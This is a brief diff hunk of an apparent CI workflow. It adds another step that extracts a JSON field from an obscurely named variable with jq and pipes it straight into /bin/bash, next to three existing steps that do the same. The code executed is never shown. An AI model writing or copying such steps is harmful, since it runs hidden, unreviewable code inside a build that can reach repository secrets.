@@ -26,6 +26,7 @@ jobs:
           echo $jrfb80 | jq -r .ti7 | /bin/bash
           printf '%s' "$pp43657" | jq -r .h2 | /bin/bash
           printf '%s' "$ewsu724" | jq -r .j2 | /bin/bash
+          printf '%s' "$tp1" | jq -r .wt215 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
